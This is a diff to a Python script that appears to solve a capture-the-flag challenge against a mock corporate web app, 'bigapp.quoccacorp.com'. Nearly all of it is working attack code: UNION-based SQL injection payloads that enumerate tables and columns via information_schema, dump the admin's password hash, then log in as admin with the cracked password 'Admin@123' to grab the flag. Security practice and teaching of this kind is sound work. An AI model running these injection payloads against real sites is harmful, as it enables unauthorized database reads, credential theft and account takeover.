@@ -6,6 +6,7 @@ from utils import get_session, find_flag
 from bs4 import BeautifulSoup
 
 BASE_URL = "https://bigapp.quoccacorp.com"
+ADMIN_EMAIL = "admin@quoccacorp.com"
 
 class Solver:
     def __init__(self):
@@ -24,16 +25,30 @@ class Solver:
 
         return last_column_values
 
-    def _get_table_names(self) -> list[str]:
+    def get_table_names(self) -> list[str]:
         return self.execute_payload("')) UNION SELECT 1, 2, 3, 4, 5, table_name, 7 FROM information_schema.tables; -- ")
 
-    def _get_column_names(self, table_name: str):
+    def get_column_names(self, table_name: str):
         return self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, column_name, 7 FROM information_schema.columns WHERE table_name = '{table_name}'; -- ")
 
     def main(self):
-        for table_name in self._get_table_names():
-            for column_name in self._get_column_names(table_name):
-                self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, {column_name}, 7 FROM {table_name}; -- ")
+        target_table_name = ""
+        for table_name in self.get_table_names():
+            for column_name in self.get_column_names(table_name):
+                values = self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, {column_name}, 7 FROM {table_name}; -- ")
+                if ADMIN_EMAIL in values:
+                    target_table_name, email_column_name = table_name, column_name
+                    break
+            if target_table_name: break
+
+        print(f"Table Name: {target_table_name}\nColumns: {self.get_column_names(target_table_name)}")
+
+        password_hash = self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, password, 7 FROM {target_table_name} WHERE {email_column_name}='{ADMIN_EMAIL}'; -- ")[0]
+        print(f"{password_hash = }") # 0e7517141fb53f21ee439b355b5a1d0a
+        PASSWORD = "Admin@123"
+
+        response = self.session.post(f"{BASE_URL}/login", data={"email": ADMIN_EMAIL, "password": PASSWORD})
+        find_flag(response.text)
 
 if __name__ == "__main__":
     Solver().main()
